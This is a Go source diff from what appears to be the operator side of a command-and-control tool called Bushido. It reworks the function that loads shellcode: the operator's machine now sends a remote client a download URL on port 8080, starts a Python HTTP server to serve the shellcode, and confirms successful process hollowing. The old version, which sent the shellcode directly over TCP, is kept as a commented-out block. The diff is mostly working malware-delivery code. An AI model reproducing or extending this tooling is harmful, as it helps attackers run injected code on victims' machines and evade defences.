@@ -153,17 +153,65 @@ func pwd(conn *net.Conn) {
 	fmt.Println()
 }
 
+// This transmits over tcp. Will make one that uses http server
+// func load(conn *net.Conn, fileWShellcode string) {
+// 	fmt.Println()
+// 	fmt.Println("[!]Local File Path:" + fileWShellcode)
+// 	file, err := os.ReadFile(fileWShellcode)
+// 	if err != nil {
+// 		fmt.Println("[-]Couldn't read the file on the local machine !")
+// 		return
+// 	}
+// 	fmt.Println("[*]Sending Signal ...")
+// 	(*conn).Write([]byte("barCode\n"))
+// 	buffer := make([]byte, 10000000)
+// 	read_len, err := (*conn).Read(buffer)
+// 	if err != nil {
+// 		fmt.Println("[-]Error Reading From Buffer")
+// 		return
+// 	}
+// 	if read_len <= 1 {
+// 		fmt.Println("[-]Error with length of Buffer")
+// 		return
+// 	}
+// 	bufferSnapped := buffer[:read_len]
+// 	bufferStr := string(bufferSnapped)
+// 	if bufferStr != "OK\n" {
+// 		fmt.Println("[-]Couldn't initate CreateThread")
+// 		return
+// 	}
+// 	fmt.Println("[+]Signal was recieved and acknowledged")
+
+// 	fmt.Println("[*]Sending shellcode")
+// 	(*conn).Write(file)
+// 	read_len, err = (*conn).Read(buffer)
+// 	if err != nil {
+// 		fmt.Println("[-]Error Reading From Buffer")
+// 		return
+// 	}
+// 	if read_len <= 1 {
+// 		fmt.Println("[-]Error with length of Buffer")
+// 		return
+// 	}
+// 	bufferSnapped = buffer[:read_len]
+// 	bufferStr = string(bufferSnapped)
+// 	if bufferStr != "OK\n" {
+// 		fmt.Println("[-]Couldn't send the shellcode")
+// 	}
+// 	fmt.Println("[+]Shellcode sent successfully !")
+// }
+
 func load(conn *net.Conn, fileWShellcode string) {
 	fmt.Println()
-	fmt.Println("[!]Local File Path:" + fileWShellcode)
-	file, err := os.ReadFile(fileWShellcode)
+	fmt.Println("[!]Local File Path: " + fileWShellcode)
+	file, err := os.Stat(fileWShellcode)
 	if err != nil {
 		fmt.Println("[-]Couldn't read the file on the local machine !")
 		return
 	}
 	fmt.Println("[*]Sending Signal ...")
 	(*conn).Write([]byte("barCode\n"))
-	buffer := make([]byte, 10000000)
+	buffer := make([]byte, 100)
 	read_len, err := (*conn).Read(buffer)
 	if err != nil {
 		fmt.Println("[-]Error Reading From Buffer")
@@ -180,24 +228,49 @@ func load(conn *net.Conn, fileWShellcode string) {
 		return
 	}
 	fmt.Println("[+]Signal was recieved and acknowledged")
-
-	fmt.Println("[*]Sending shellcode")
-	(*conn).Write(file)
+	localAddress := (*conn).LocalAddr().String()
+	localIP := strings.Split(localAddress, ":")[0]
+	//Since we hard coded it to be 8080 the port we listen on we do the folowing
+	downloadURL := "http://" + localIP + ":8080/" + file.Name()
+	(*conn).Write([]byte(downloadURL))
 	read_len, err = (*conn).Read(buffer)
 	if err != nil {
 		fmt.Println("[-]Error Reading From Buffer")
 		return
 	}
 	if read_len <= 1 {
-		fmt.Println("[-]Error with length of Buffer")
+		fmt.Println("[-]Error with length of buffer")
 		return
 	}
 	bufferSnapped = buffer[:read_len]
 	bufferStr = string(bufferSnapped)
 	if bufferStr != "OK\n" {
-		fmt.Println("[-]Couldn't send the shellcode")
+		fmt.Println("[-]URL did not send")
+		return
 	}
-	fmt.Println("[+]Shellcode sent successfully !")
+	fmt.Println("[+]Download URL sent successfully !")
+	fmt.Println("[*]Started python HTTP Server in Bushido dir")
+	fmt.Println("[!]Manually terminate the HTTP server after the client recieves the shellcode !")
+	cmd := exec.Command("./scripts/pythonServer.sh")
+	cmd.Run()
+	read_len, err = (*conn).Read(buffer)
+	if err != nil {
+		fmt.Println("[-]Error Reading From Buffer")
+		return
+	}
+	if read_len <= 1 {
+		fmt.Println("[-]Error with length of buffer")
+		return
+	}
+	//(*conn).SetReadDeadline(10 * time.Second)
+	bufferSnapped = buffer[:read_len]
+	bufferStr = string(bufferSnapped)
+	if bufferStr != "OK\n" {
+		fmt.Println("[-]Something went wrong")
+		return
+	}
+	fmt.Println("[+]Successful Proccess Hollowing !")
+	fmt.Println()
 }
 
 func hollow(conn *net.Conn, filePathLocal string, filePathRemote string) {
@@ -207,7 +280,7 @@ func hollow(conn *net.Conn, filePathLocal string, filePathRemote string) {
 		return
 	}
 	//now we enter the hollowing function
-	buffer := make([]byte, 1000000) //Fix buffer size later
+	buffer := make([]byte, 100) //Fix buffer size later
 	fmt.Println("[*]Sending Signal ...")
 	(*conn).Write([]byte("hollow\n"))
 	read_len, err := (*conn).Read(buffer)
